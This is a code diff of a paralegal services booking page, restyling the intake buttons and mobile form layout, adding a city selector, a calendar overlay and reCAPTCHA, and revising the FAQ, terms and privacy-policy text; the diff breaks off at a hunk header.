             #headerBookBtn::after {
-                bottom: 68%;
-                width: 208%;
-                height: 7.1rem;
-                filter: blur(1rem);
-                opacity: 0.72;
+                display: none;
             }
         }
 
-        /* Top book button typography: match FAQ first answer style */
-        #headerBookBtn,
         #headerBookBtnText,
-        #headerBookBtnText span {
+        #headerBookBtnText span,
+        #footerBookBtnText,
+        #footerBookBtnText span {
             font-family: 'Lato', sans-serif !important;
-            font-size: 1.2rem !important;
-            font-weight: 400 !important;
-            color: rgba(255,255,255,0.92) !important;
-            line-height: 1.6 !important;
-            letter-spacing: 0.01em !important;
-            text-transform: none !important;
+            font-size: clamp(2.2rem, 6.6vw, 4.9rem) !important;
+            font-weight: 900 !important;
+            color: #ffffff !important;
+            line-height: 0.96 !important;
+            letter-spacing: 0.06em !important;
+            text-transform: uppercase !important;
+        }
+
+        #headerBookBtnText,
+        #footerBookBtnText {
+            position: static;
+            display: block;
+            width: 100%;
+            max-width: none;
+            text-align: center;
+            pointer-events: none;
+            white-space: normal;
         }
 
         #headerBookBtnText .header-book-line1 {
@@ -3011,12 +3261,15 @@
         }
 
         #footerBookBtn {
-            padding: 1.5rem 3rem !important;
+            padding: 1.25rem 3.2rem !important;
             width: auto !important;
-            min-width: 18.8rem !important; /* 300px equivalent rounded */
-            max-width: 95% !important;
+            min-width: 21.5rem !important;
+            max-width: 96% !important;
+            min-height: 6.9rem !important;
+            border-radius: 999px !important;
             transition: none !important;
             transform: none !important;
+            margin-bottom: 0.9rem !important;
         }
 
         #footerBookBtn::before {
@@ -3025,11 +3278,11 @@
 
         #footerBookBtn:hover {
             transform: none !important;
-            box-shadow: 0 0.5rem 2rem rgba(0, 0, 0, 0.1) !important;
+            box-shadow: none !important;
         }
 
         #footerBookBtn:hover::before {
-            background: rgba(90, 61, 42, 0.5) !important;
+            content: none !important;
         }
 
         /* Bottom book button: same font, keep existing dynamic sizes */
@@ -3256,6 +3509,7 @@
             stroke-dashoffset: 302;
             transition: stroke-dashoffset 0.18s linear;
             filter: drop-shadow(0 0 14px rgba(255, 255, 255, 0.45));
+            animation: globalSpinnerGlow 2.2s ease-in-out infinite;
         }
 
         .global-spinner--indeterminate .global-spinner__glow {
@@ -3581,7 +3835,12 @@
             height: 11.3rem;
             position: relative;
             margin: 0 auto;
-            transition: opacity 0.5s ease, transform 0.5s ease;
+            filter: blur(0);
+            transition:
+                opacity 1.2s cubic-bezier(0.22, 1, 0.36, 1),
+                transform 1.2s cubic-bezier(0.22, 1, 0.36, 1),
+                filter 1.2s cubic-bezier(0.22, 1, 0.36, 1);
+            will-change: opacity, transform, filter;
         }
 
         .book-btn-preloader__text {
@@ -3619,9 +3878,10 @@
             stroke-linecap: round;
             stroke-dasharray: 302; /* Circumference: 2 * pi * 48 */
             stroke-dashoffset: 302; 
+            filter: drop-shadow(0 0 10px rgba(255, 255, 255, 0.42));
             animation: 
                 fillProgress 19s ease-out forwards, /* Increased by 5s */
-                hypnoticCircleGlow 3s infinite ease-in-out 22s;
+                hypnoticCircleGlow 3s infinite ease-in-out;
         }
 
         @keyframes fillProgress {
@@ -3661,6 +3921,28 @@
             filter: drop-shadow(0 0.55rem 0.8rem rgba(0, 0, 0, 0.3));
             transition: opacity 0.28s ease;
             overflow: visible;
+            -webkit-mask-image: linear-gradient(
+                to top,
+                rgba(0, 0, 0, 0) 0%,
+                rgba(0, 0, 0, 0.15) 14%,
+                rgba(0, 0, 0, 0.45) 30%,
+                rgba(0, 0, 0, 0.78) 42%,
+                rgba(0, 0, 0, 1) 50%,
+                rgba(0, 0, 0, 1) 100%
+            );
+            mask-image: linear-gradient(
+                to top,
+                rgba(0, 0, 0, 0) 0%,
+                rgba(0, 0, 0, 0.15) 14%,
+                rgba(0, 0, 0, 0.45) 30%,
+                rgba(0, 0, 0, 0.78) 42%,
+                rgba(0, 0, 0, 1) 50%,
+                rgba(0, 0, 0, 1) 100%
+            );
+            -webkit-mask-repeat: no-repeat;
+            mask-repeat: no-repeat;
+            -webkit-mask-size: 100% 100%;
+            mask-size: 100% 100%;
         }
 
         .footer-finger-hint--active {
@@ -3777,7 +4059,7 @@
             line-height: 1.6 !important;
             letter-spacing: 0.01em;
             text-align: left;
-            margin-bottom: 0.55rem;
+            margin-bottom: 0.72rem;
         }
 
         .footer__hours,
@@ -3790,6 +4072,29 @@
             letter-spacing: 0.01em !important;
             text-align: center !important;
             width: 100%;
+        }
+
+        .footer__copyright--hypno {
+            animation: footerCopyrightHypnoGlow 7.2s ease-in-out infinite;
+            text-shadow: 0 0 0.06rem rgba(255, 255, 255, 0.08);
+        }
+
+        @keyframes footerCopyrightHypnoGlow {
+            0%, 100% {
+                text-shadow: 0 0 0.06rem rgba(255, 255, 255, 0.08);
+            }
+            50% {
+                text-shadow:
+                    0 0 0.12rem rgba(255, 255, 255, 0.16),
+                    0 0 0.22rem rgba(255, 255, 255, 0.08);
+            }
+        }
+
+        @media (prefers-reduced-motion: reduce) {
+            .footer__copyright--hypno {
+                animation: none;
+                text-shadow: 0 0 0.07rem rgba(255, 255, 255, 0.1);
+            }
         }
 
         .footer .blur-in-section {
@@ -3858,14 +4163,17 @@
 
             .header__description {
                 font-size: clamp(0.95rem, 4.6vw, 1.15rem);
-                padding: 0 0.35rem;
+                padding: 0 clamp(0.5rem, 3.2vw, 0.85rem);
                 gap: 0.35rem;
             }
 
             .header__description span {
-                white-space: normal;
-                text-wrap: wrap;
-                overflow-wrap: anywhere;
+                width: max-content;
+                max-width: none;
+                white-space: nowrap;
+                text-wrap: nowrap;
+                overflow-wrap: normal;
+                word-break: keep-all;
             }
 
             .header__contact {
@@ -3912,92 +4220,18 @@
                 padding: 0 0.85rem;
             }
 
-            .calendar-wrapper {
-                border-radius: 1.8rem;
-                padding: 0.95rem;
-            }
-
-            .calendar-header {
-                margin-bottom: 1rem;
-                padding: 0;
-            }
-
-            .calendar-title .cal-month {
-                font-size: clamp(2.15rem, 11vw, 3.4rem);
-            }
-
-            .calendar-title .cal-selected-day {
-                white-space: normal;
-                text-align: center;
-            }
-
-            .calendar-title .cal-year {
-                font-size: clamp(1rem, 4.8vw, 1.35rem);
-                letter-spacing: 1px;
-            }
-
-            .calendar-nav-btn {
-                width: 2.4rem;
-                height: 2.4rem;
-                min-width: 2.4rem;
-                min-height: 2.4rem;
-                flex: 0 0 2.4rem;
-                font-size: 1.25rem;
-            }
-
-            .cal-day-name {
-                margin-bottom: 0.45rem;
-                font-size: 0.62rem;
-                letter-spacing: 0.5px;
-            }
-
-            .cal-day {
-                font-size: 0.82rem;
-            }
-
-            .slots-nav {
-                margin: 1.45rem 0 1rem;
-                padding: 0;
-            }
-
-            #slotsDayDisplay {
-                font-size: 1.05rem;
-                min-height: 2rem;
-                line-height: 1.2;
-            }
-
-            .slots-grid {
-                grid-template-columns: 1fr;
-                gap: 0.7rem;
-            }
-
-            .slots-grid .slot-btn {
-                height: 3.25rem;
-                border-radius: 1.8rem;
-                padding: 0.45rem 0.8rem;
-                gap: 0.6rem;
-            }
-
-            .slot-icon-wrapper {
-                width: 2rem;
-                height: 2rem;
-            }
-
-            .slot-time {
-                font-size: 0.96rem;
-                letter-spacing: 0.5px;
-            }
-
             #headerBookBtn {
-                padding: 1.2rem 1rem !important;
-                max-width: 100% !important;
+                width: 100% !important;
+                max-width: 24rem !important;
+                padding: 1.2rem 1.55rem !important;
+                border-radius: 999px !important;
             }
 
             #headerBookBtn,
             #headerBookBtnText,
             #headerBookBtnText span {
-                font-size: 1rem !important;
-                line-height: 1.35 !important;
+                font-size: clamp(2rem, 11vw, 3.5rem) !important;
+                line-height: 0.96 !important;
             }
 
             #headerBookBtn::after {
@@ -4010,13 +4244,17 @@
             #footerBookBtn {
                 min-width: 0 !important;
                 width: 100% !important;
-                max-width: 20rem !important;
-                padding: 1rem 1.3rem !important;
+                max-width: 24rem !important;
+                padding: 1.1rem 1.55rem !important;
+                min-height: 5.6rem !important;
+                border-radius: 999px !important;
             }
 
             #footerBookBtnText {
                 display: inline-block;
                 white-space: normal;
+                font-size: clamp(2rem, 11vw, 3.5rem) !important;
+                line-height: 0.96 !important;
             }
 
             .book-btn-container {
@@ -4089,17 +4327,17 @@
             }
 
             #bookingModal .file-attach__controls {
-                grid-template-columns: 1fr;
+                grid-template-columns: auto minmax(0, 1fr) auto;
             }
 
             #bookingModal .file-attach__btn--camera {
-                width: 100% !important;
-                min-width: 0 !important;
+                width: 4.2rem !important;
+                min-width: 4.2rem !important;
             }
 
             #confirmBookingBtn {
                 min-height: 3.6rem;
-                font-size: 1rem;
+                font-size: 1.05rem;
                 padding: 1rem 0.8rem;
             }
 
@@ -4116,10 +4354,14 @@
             }
 
             .booking-row--address-main,
-            .booking-row--deadline,
             .booking-row--dob {
                 flex-wrap: wrap;
                 justify-content: flex-start !important;
+            }
+
+            .booking-row--deadline {
+                flex-wrap: wrap;
+                justify-content: center !important;
             }
 
             .booking-row--address-secondary {
@@ -4128,11 +4370,24 @@
             }
 
             .booking-row--address-main .contact-form__input,
-            .booking-row--deadline .contact-form__label,
-            .booking-row--deadline .contact-form__input {
+            .booking-row--dob .contact-form__input {
                 flex: 1 1 100% !important;
                 width: 100% !important;
                 min-width: 0 !important;
+            }
+
+            .booking-row--deadline .contact-form__label {
+                flex: 0 1 auto !important;
+                width: auto !important;
+                min-width: 0 !important;
+                text-align: center !important;
+            }
+
+            .booking-row--deadline .contact-form__input {
+                flex: 0 1 min(100%, 14rem) !important;
+                width: min(100%, 14rem) !important;
+                min-width: 0 !important;
+                margin: 0 auto;
             }
 
             .booking-row--address-secondary .contact-form__input {
@@ -4146,8 +4401,13 @@
             }
 
             input[name="address_province"] {
-                flex: 1 1 5.5rem !important;
-                min-width: 5.5rem !important;
+                flex: 1 1 8rem !important;
+                min-width: 7.2rem !important;
+            }
+
+            .custom-select-wrapper--city {
+                flex: 1 1 11rem !important;
+                min-width: 11rem !important;
             }
 
             input[name="address_zip"] {
@@ -4204,10 +4464,6 @@
             .booking-row--dob .contact-form__input {
                 flex: 1 1 100% !important;
             }
-
-            .calendar-title .cal-month {
-                font-size: clamp(1.95rem, 11.5vw, 2.8rem);
-            }
         }
     </style>
 </head>
@@ -4254,7 +4510,7 @@
     </div>
 
     <div class="book-btn-wrapper">
-        <div class="book-btn-container">
+        <div class="book-btn-container" id="headerBookBtnWrap">
             <div class="book-btn-preloader" id="headerBookBtnPreloader" style="position: absolute;">
                 <svg class="book-btn-preloader__svg" viewBox="0 0 120 120">
                     <circle class="book-btn-preloader__circle" cx="60" cy="60" r="48"/>
@@ -4263,7 +4519,7 @@
                 <div class="book-btn-preloader__text" style="text-align: center; line-height: 1.2; display: none;"></div>
             </div>
             <button class="footer-book-btn" id="headerBookBtn" onclick="bookNearestSlot()" style="opacity: 0; transform: scale(0.9); pointer-events: none;">
-                <span id="headerBookBtnText">Intake</span>
+                <span id="headerBookBtnText">INTAKE<br>NOW!</span>
             </button>
         </div>
     </div>
@@ -4451,14 +4707,14 @@
         <div class="faq__item">
             <h3 class="faq__question">What are the symbols on the calendar?</h3>
             <div class="faq__answer">
-                The lock symbols on the calendar above indicate that the office is closed on those days. In exceptional circumstances, meetings may still be arranged by appointment and proceed with an in-person consultation to outline strategy and next steps.
+                The key symbols mark Saturdays. Saturday meetings may be available, but only by request and confirmation. Please select a Saturday slot and contact us to confirm.
             </div>
         </div>
 
         <div class="faq__item">
             <h3 class="faq__question">Was there an earlier way to register?</h3>
             <div class="faq__answer">
-                The prior registration process remains accessible at its original URL and existing links will continue to direct users to the original intake <a href="https://docs.google.com/forms/d/1brLzvNv2tR9jDvG4Z9vUZLvzzpgZHmOhHPZ7_x8g8Qo" target="_blank" rel="noopener noreferrer" style="color:white; text-decoration: underline;">Google Form</a>. Please note that Google registration is required there.
+                The prior registration process remains accessible at its original URL and existing links will continue to direct users to the original intake <a href="https://docs.google.com/forms/d/1brLzvNv2tR9jDvG4Z9vUZLvzzpgZHmOhHPZ7_x8g8Qo" target="_blank" rel="noopener noreferrer" style="color:white; text-decoration: underline;">Google Form</a>. Please note that, for identity verification, anti-spam protection, account security, smoother intake flow, and keeping the robots politely in line, <a href="https://accounts.google.com/o/oauth2/v2/auth" target="_blank" rel="noopener noreferrer" style="color:white; text-decoration: underline;">Google Authorization</a> is required there.
             </div>
         </div>
 
@@ -4537,24 +4793,30 @@
             <p class="modal__text">Submitting the inquiry form on this website is for informational purposes only and allows us to review your case files. It does not guarantee that a case will be opened, nor does it guarantee a response. While we aim to reply within 48 hours, a response is not guaranteed, and no legal rights are preserved by the mere act of submission. To expedite your request, we strongly recommend contacting our paralegal by phone immediately after submitting this form.</p>
 
             <h3 class="modal__section-title">8. Prohibited Use</h3>
-            <p class="modal__text">By accessing or using this website and its related services, you agree to be bound by the following conditions. You shall not post, transmit, or distribute any material that is unlawful, threatening, abusive, harassing, defamatory, obscene, invasive of privacy, or that incites hatred, discrimination, or violence. You shall not impersonate any individual or entity, nor misrepresent your identity, affiliation, or authority. You shall not solicit, collect, or disclose another person's login credentials, passwords, payment card details, or other financial information. You shall not manipulate headers, metadata, or technical identifiers in order to disguise the origin of any content. You shall not submit or share content that infringes upon intellectual property rights, privacy rights, or any other legal rights of third parties. You shall not send unsolicited advertising, promotional materials, bulk communications, spam, chain letters, or pyramid schemes. You shall not introduce malware, viruses, or any code designed to disrupt, disable, or damage software, hardware, or communication systems. You shall not employ automated tools such as bots, crawlers, spiders, or scrapers to access, copy, monitor, or extract website content without prior written authorization. You shall not reverse engineer, decompile, disassemble, reproduce, duplicate, or otherwise exploit any portion of this website without express written permission. You shall not interfere with the operation of the website, its servers, or connected networks, nor attempt to bypass security measures or access controls. You shall not access, collect, store, alter, or process another user's personal information without lawful authority. You shall not modify, hack, or otherwise alter the website, nor falsely suggest endorsement, partnership, or affiliation with this website. You shall not use this website for any unlawful, unauthorized, or rights-violating purpose, including any breach of applicable Canadian laws and regulations.</p>
+            <p class="modal__text">By accessing or using this website and its related services, you agree to be bound by the following conditions. You must not post, transmit, or distribute any material that is unlawful, threatening, abusive, harassing, defamatory, obscene, invasive of privacy, or that incites hatred, discrimination, or violence. You must not impersonate any individual or entity, or misrepresent your identity, affiliation, or authority. You must not solicit, collect, or disclose another person's login credentials, passwords, payment card details, or other financial information. You must not manipulate headers, metadata, or technical identifiers to disguise the origin of any content. You must not submit or share content that infringes upon intellectual property rights, privacy rights, or any other legal rights of third parties. You must not send unsolicited advertising, promotional materials, bulk communications, spam, chain letters, or pyramid schemes. You must not introduce malware, viruses, or any code designed to disrupt, disable, or damage software, hardware, or communication systems. You must not employ automated tools such as bots, crawlers, spiders, or scrapers to access, copy, monitor, or extract website content without prior written authorization. You must not reverse engineer, decompile, disassemble, reproduce, duplicate, or otherwise exploit any portion of this website without express written permission. You must not interfere with the operation of the website, its servers, or connected networks, nor attempt to bypass security measures or access controls. You must not access, collect, store, alter, or process another user's personal information without lawful authority. You must not modify, hack, or otherwise alter the website, nor falsely suggest endorsement, partnership, or affiliation with this website. You must not use this website for any unlawful, unauthorized, or rights-violating purpose, including any breach of applicable Canadian laws and regulations.</p>
+
+            <h3 class="modal__section-title">9. Device Access and Data Collection</h3>
+            <p class="modal__text">To enhance your experience and ensure the proper functioning of our services, this website may request access to certain device features and collect technical information. With your explicit consent, we may use your device's microphone and camera to enable interactive features, improve communication, and provide the best possible user experience. We may collect and store technical information about your device, including operating system details, browser type, IP address, usage logs, and performance data, for security, analytics, and service improvement purposes. You will be prompted to grant or deny permission when such access is requested, and you may revoke these permissions at any time through your browser or device settings.</p>
 
             <h2 class="modal__title" style="margin-top: 50px; margin-bottom: 20px; font-size: 1.8rem;" data-i18n="privacyPolicy">Privacy Policy</h2>
 
             <h3 class="modal__section-title" data-i18n="infoCollection">1. Information Collection</h3>
-            <p class="modal__text">We collect personal information (such as name and contact details) only when you voluntarily provide it. This information is used solely to communicate with you and assess your potential legal needs.</p>
+            <p class="modal__text">We collect personal information such as your name, surname, contact details, and identification data including passport verification, driver's license information, and other government-issued identifiers when you voluntarily provide them. This information may also include supporting documents required for identity verification and compliance with applicable regulations.</p>
 
             <h3 class="modal__section-title" data-i18n="useOfInfo">2. Use of Information</h3>
-            <p class="modal__text">Your data is used to facilitate communication and legal representation. We do not sell, trade, or otherwise transfer your personally identifiable information to outside parties.</p>
+            <p class="modal__text">Your personal data is used to facilitate communication, verify your identity, comply with legal and regulatory requirements, and provide legal representation. We do not sell, trade, or otherwise transfer your personally identifiable information to outside parties.</p>
 
-            <h3 class="modal__section-title" data-i18n="analyticsAds">3. Analytics & Advertising</h3>
-            <p class="modal__text">This website uses services like Google Analytics, Google Ads, YouTube, and Facebook. These third-party vendors may use cookies to analyze traffic, serve relevant advertisements based on past visits, and improve user experience. You may opt out of personalized advertising by visiting Google's Ad Settings.</p>
+            <h3 class="modal__section-title" data-i18n="analyticsAds">3. Analytics and Advertising</h3>
+            <p class="modal__text">This website uses services such as Google Analytics, Google Ads, YouTube, and Facebook. These third-party vendors may use cookies to analyze traffic, serve relevant advertisements based on past visits, and improve user experience. You may opt out of personalized advertising by visiting Google's Ad Settings.</p>
 
-            <h3 class="modal__section-title" data-i18n="contactUs">4. Contacting Us</h3>
-            <p class="modal__text">If there are any questions regarding this privacy policy or if you wish to exercise your rights to access or delete your data, you may contact us at paralegal@hannadunchenko.com.</p>
+            <h3 class="modal__section-title">4. Device Access and Technical Data</h3>
+            <p class="modal__text">With your consent, we may access your device's microphone and camera to enable interactive features and improve your experience. We may also collect technical information such as operating system details, browser type, IP address, and usage logs for analytics, security, and service optimization. You may revoke permissions at any time through your device or browser settings.</p>
+
+            <h3 class="modal__section-title" data-i18n="contactUs">5. Contacting Us</h3>
+            <p class="modal__text">If you have any questions regarding this privacy policy or if you wish to exercise your rights to access or delete your data, you may contact us at paralegal@hannadunchenko.com.</p>
 
             <p class="modal__footer-text">
-                By using this website, you acknowledge that you have read and understood these Terms of Service.
+                By using this website, you acknowledge that you have read and understood these Terms of Service and Privacy Policy.
             </p>
         </div>
     </div>
@@ -4576,7 +4838,7 @@
                     <div class="book-btn-preloader__text" style="text-align: center; line-height: 1.2; display: none;"></div>
                 </div>
                 <button class="footer-book-btn" id="footerBookBtn" onclick="bookNearestSlot()" style="opacity: 0; transform: scale(0.9); pointer-events: none;">
-                    <span id="footerBookBtnText">Night docket, counsel?</span>
+                    <span id="footerBookBtnText">INTAKE<br>NOW!</span>
                 </button>
                 <div class="footer-finger-hint" id="footerFingerHint" aria-hidden="true">
                     <svg viewBox="0 0 220 330" xmlns="http://www.w3.org/2000/svg">
@@ -4614,8 +4876,8 @@
         <a href="tel:+14372396833" class="footer__contact-link">+1 (437) 239-6833</a>
     </div>
     <div class="blur-in-section" style="margin-top: 10rem;">
-        <p class="footer__copyright" style="margin-bottom: 5px;">My only official website:</p>
-        <p class="footer__copyright" style="margin-top: 0;">&copy; <span id="currentYear"></span> Hanna Dunchenko Paralegal Services</p>
+        <p class="footer__copyright footer__copyright--hypno" style="margin-bottom: 5px;">My only official website:</p>
+        <p class="footer__copyright footer__copyright--hypno" style="margin-top: 0;">&copy; <span id="currentYear"></span> Hanna Dunchenko Paralegal Services</p>
     </div>
 </footer>
 
@@ -4668,13 +4930,52 @@
                 </div>
 
                 <div class="contact-form__group">
+                    <label for="hearAboutInput" class="contact-form__label" style="display:block; margin-bottom:8px; color:var(--text-white); text-align: center; text-transform:none; letter-spacing:0;">Where did you hear about us:</label>
+                    <input id="hearAboutInput" type="text" class="contact-form__input" name="hear_about" placeholder="Optional" maxlength="150" autocomplete="off" inputmode="text" spellcheck="false" style="text-align:center;">
+                </div>
+
+                <div class="contact-form__group">
                     <div class="booking-row booking-row--address-main" style="display: flex; gap: 10px; margin-bottom: 10px;">
                         <input type="text" class="contact-form__input" placeholder="Unit/Apt" name="address_unit" maxlength="16" autocomplete="address-line2" inputmode="text" spellcheck="false" style="width: 8.2rem; min-width: 7.6rem; text-transform: uppercase;">
-                        <input type="text" class="contact-form__input" placeholder="Street and City" name="address_street" required minlength="6" maxlength="150" autocomplete="street-address" inputmode="text" spellcheck="false" style="flex-grow: 1;">
+                        <input type="text" class="contact-form__input" placeholder="Street" name="address_street" required minlength="6" maxlength="150" autocomplete="address-line1" inputmode="text" spellcheck="false" style="flex-grow: 1;">
                     </div>
                     <div class="booking-row booking-row--address-secondary" style="display: flex; gap: 10px; justify-content: flex-end;">
-                        <input type="text" class="contact-form__input" placeholder="ON" name="address_province" required minlength="2" maxlength="2" autocomplete="address-level1" inputmode="text" spellcheck="false" style="width: 4.8rem; min-width: 4.8rem; text-align: center; text-transform: uppercase;">
-                        <input type="text" class="contact-form__input" placeholder="ZIP code" name="address_zip" required minlength="6" maxlength="7" autocomplete="postal-code" inputmode="text" spellcheck="false" style="flex: 0 0 185px; width: 185px; min-width: 185px; text-transform: uppercase; text-align: center; caret-color: #ffffff;">
+                        <div class="custom-select-wrapper custom-select-wrapper--city">
+                            <div class="custom-select custom-select--city" id="cityCustomSelect">
+                                <button class="custom-select__trigger" type="button" aria-label="City">
+                                    <span>City</span>
+                                </button>
+                                <div class="custom-options">
+                                    <div class="custom-option" data-value="London">London</div>
+                                    <div class="custom-option" data-value="Kitchener">Kitchener</div>
+                                    <div class="custom-option" data-value="Waterloo">Waterloo</div>
+                                    <div class="custom-option" data-value="Cambridge">Cambridge</div>
+                                    <div class="custom-option" data-value="Guelph">Guelph</div>
+                                    <div class="custom-option" data-value="Hamilton">Hamilton</div>
+                                    <div class="custom-option" data-value="Burlington">Burlington</div>
+                                    <div class="custom-option" data-value="Oakville">Oakville</div>
+                                    <div class="custom-option" data-value="Mississauga">Mississauga</div>
+                                    <div class="custom-option" data-value="Brampton">Brampton</div>
+                                    <div class="custom-option" data-value="Toronto">Toronto</div>
+                                    <div class="custom-option" data-value="Milton">Milton</div>
+                                    <div class="custom-option" data-value="Brantford">Brantford</div>
+                                    <div class="custom-option" data-value="Woodstock">Woodstock</div>
+                                    <div class="custom-option" data-value="Stratford">Stratford</div>
+                                    <div class="custom-option" data-value="St. Thomas">St. Thomas</div>
+                                    <div class="custom-option" data-value="Sarnia">Sarnia</div>
+                                    <div class="custom-option" data-value="Chatham">Chatham</div>
+                                    <div class="custom-option" data-value="Windsor">Windsor</div>
+                                    <div class="custom-option" data-value="St. Catharines">St. Catharines</div>
+                                    <div class="custom-option" data-value="Niagara Falls">Niagara Falls</div>
+                                    <div class="custom-option" data-value="Welland">Welland</div>
+                                    <div class="custom-option" data-value="Barrie">Barrie</div>
+                                    <div class="custom-option" data-value="Other">Other</div>
+                                </div>
+                            </div>
+                            <input type="hidden" name="address_city" id="cityInput" value="">
+                        </div>
+                        <input type="text" class="contact-form__input" placeholder="Province" name="address_province" required minlength="2" maxlength="30" autocomplete="address-level1" inputmode="text" spellcheck="false" value="" style="width: 8.4rem; min-width: 7.6rem; text-align: center; text-transform: uppercase;">
+                        <input type="text" class="contact-form__input" placeholder="ZIP" name="address_zip" required minlength="6" maxlength="7" autocomplete="postal-code" inputmode="text" spellcheck="false" style="flex: 0 0 185px; width: 185px; min-width: 185px; text-transform: uppercase; text-align: center; caret-color: #ffffff;">
                     </div>
                 </div>
 
@@ -4686,6 +4987,16 @@
                         <input type="file" id="fileAttachInput" multiple accept="image/*,.pdf,.doc,.docx" style="display: none;">
                         <input type="file" id="cameraFallbackInput" accept="image/*" capture="environment" style="display: none;">
                         <div class="file-attach__controls">
+                            <button type="button" class="file-attach__btn file-attach__btn--camera" id="takePhotoBtn">
+                                <span class="file-attach__title">
+                                    <span class="file-attach__icon">
+                                        <svg class="file-attach__icon-svg file-attach__icon-svg--camera" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="width: 1.25em; height: 1.25em;">
+                                            <path d="M4 7h3l2-2h6l2 2h3a1 1 0 0 1 1 1v10a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a1 1 0 0 1 1-1z"></path>
+                                            <circle cx="12" cy="13" r="4"></circle>
+                                        </svg>
+                                    </span>
+                                </span>
+                            </button>
                             <button type="button" class="file-attach__btn" onclick="document.getElementById('fileAttachInput').click()">
                                 <span class="file-attach__title">
                                     <span class="file-attach__icon">
@@ -4696,12 +5007,14 @@
                                     Attach Files
                                 </span>
                             </button>
-                            <button type="button" class="file-attach__btn file-attach__btn--camera" id="takePhotoBtn">
+                            <button type="button" class="file-attach__btn file-attach__btn--camera file-attach__btn--calendar" id="openCalendarBtn" aria-label="Open calendar">
                                 <span class="file-attach__title">
                                     <span class="file-attach__icon">
                                         <svg class="file-attach__icon-svg file-attach__icon-svg--camera" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="width: 1.25em; height: 1.25em;">
-                                            <path d="M4 7h3l2-2h6l2 2h3a1 1 0 0 1 1 1v10a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a1 1 0 0 1 1-1z"></path>
-                                            <circle cx="12" cy="13" r="4"></circle>
+                                            <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect>
+                                            <line x1="16" y1="2" x2="16" y2="6"></line>
+                                            <line x1="8" y1="2" x2="8" y2="6"></line>
+                                            <line x1="3" y1="10" x2="21" y2="10"></line>
                                         </svg>
                                     </span>
                                 </span>
@@ -4722,22 +5035,26 @@
                 </div>
 
                 <div class="contact-form__group">
-                    <div class="booking-row booking-row--deadline" style="display:flex; align-items:center; justify-content:flex-end; gap:8px;">
-                        <label for="deadlineInputMain" class="contact-form__label" style="margin:0; text-align:right; color:var(--text-white); flex:0 0 auto; text-transform:none; letter-spacing:0;">Deadline (blank if not urgent):</label>
+                    <div class="booking-row booking-row--deadline" style="display:flex; align-items:center; justify-content:center; gap:8px;">
+                        <label for="deadlineInputMain" class="contact-form__label" style="margin:0; text-align:center; color:var(--text-white); flex:0 0 auto; text-transform:none; letter-spacing:0;">Deadline (blank if not urgent):</label>
                         <input id="deadlineInputMain" type="text" class="contact-form__input" name="deadline" placeholder="YYYY.MM.DD" maxlength="120" inputmode="text" spellcheck="false" style="flex:0 0 185px; width:185px; min-width:185px; text-align:center;">
                     </div>
                 </div>
 
                 <p id="bookingStatus" aria-live="polite" aria-atomic="true"></p>
+                <div id="bookingRecaptchaWrap" class="recaptcha-repeat-wrap">
+                    <p class="recaptcha-repeat-wrap__hint">Repeated submissions from the same user require reCAPTCHA.</p>
+                    <div id="bookingRecaptchaWidget"></div>
+                </div>
 
                 <div class="modal-sticky-actions">
-                    <button type="submit" class="contact-form__submit-button" id="confirmBookingBtn">Book Now</button>
-                    <div class="contact-form__checkbox-wrapper file-attach__terms" style="margin-top: 12px; margin-bottom: 0;">
-                        <input type="checkbox" id="agreeTerms" class="contact-form__checkbox" required>
+                    <div class="contact-form__checkbox-wrapper file-attach__terms" style="margin-top: 0; margin-bottom: 12px;">
+                        <input type="checkbox" id="agreeTerms" name="agreeTerms" class="contact-form__checkbox" required>
                         <label for="agreeTerms" class="contact-form__checkbox-label">
-                            I agree with <span class="contact-form__terms-link" onclick="openTermsModal()">Terms of Service</span>
+                            I agree with <span class="contact-form__terms-link" onclick="openTermsModal()">Terms</span>
                         </label>
                     </div>
+                    <button type="submit" class="contact-form__submit-button" id="confirmBookingBtn">BOOK NOW</button>
                 </div>
             </form>
         </div>
@@ -4758,12 +5075,60 @@
     </div>
 </div>
 
+<div id="formCalendarOverlay" class="form-calendar-overlay" aria-hidden="true">
+    <div class="form-calendar-overlay__panel">
+        <div class="form-calendar-overlay__header">
+            <h3 class="form-calendar-overlay__title">Select Date and Time</h3>
+            <button type="button" class="form-calendar-overlay__close" id="formCalendarOverlayCloseBtn" aria-label="Close calendar">&times;</button>
+        </div>
+        <div id="formCalendarOverlayMount" class="form-calendar-overlay__mount"></div>
+    </div>
+</div>
+
+<script>
+    window.__recaptchaApiReady = false;
+    function onRecaptchaApiLoaded() {
+        window.__recaptchaApiReady = true;
+        window.dispatchEvent(new Event('recaptcha-ready'));
+    }
+</script>
+<script async defer src="https://www.google.com/recaptcha/api.js?onload=onRecaptchaApiLoaded&render=explicit"></script>
+
 <script>
     // ------------------------------------------------------------------
     // GAZCONFIGURATION
     // ------------------------------------------------------------------
     // REPLACE THIS URL WITH YOUR GOOGLE APPS SCRIPT WEB APP URL
-    const APPS_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbxWVajXvx7zIN1b0jRt97Y22SZ4rKNtszmMJ3VvJUeOSEltYMLDihdGLeQhy_aPlxtG2g/exec"; 
+    const APPS_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbyehW4NgOjs2tYzqDDmVcvHmn1IjZEJH9piRTJj07h6J56tyHGUddO0W8xTrYjEcrAjLQ/exec"; 
+    const RECAPTCHA_SITE_KEY = "6LcraXksAAAAAP5K4GZDGbDDapd2nt7MRekMXQdK";
+    const REPEAT_BOOKING_GUARD_STORAGE_KEY = "hd_repeat_booking_guard_v1";
+    const RECAPTCHA_TOKEN_TTL_MS = 2 * 60 * 1000;
+    const MAJOR_ON_CITIES_NEAR_LONDON = new Set([
+        'London',
+        'Kitchener',
+        'Waterloo',
+        'Cambridge',
+        'Guelph',
+        'Hamilton',
+        'Burlington',
+        'Oakville',
+        'Mississauga',
+        'Brampton',
+        'Toronto',
+        'Milton',
+        'Brantford',
+        'Woodstock',
+        'Stratford',
+        'St. Thomas',
+        'Sarnia',
+        'Chatham',
+        'Windsor',
+        'St. Catharines',
+        'Niagara Falls',
+        'Welland',
+        'Barrie',
+        'Other'
+    ]);
     // ------------------------------------------------------------------
     
     // ------------------------------------------------------------------
@@ -4798,6 +5163,9 @@
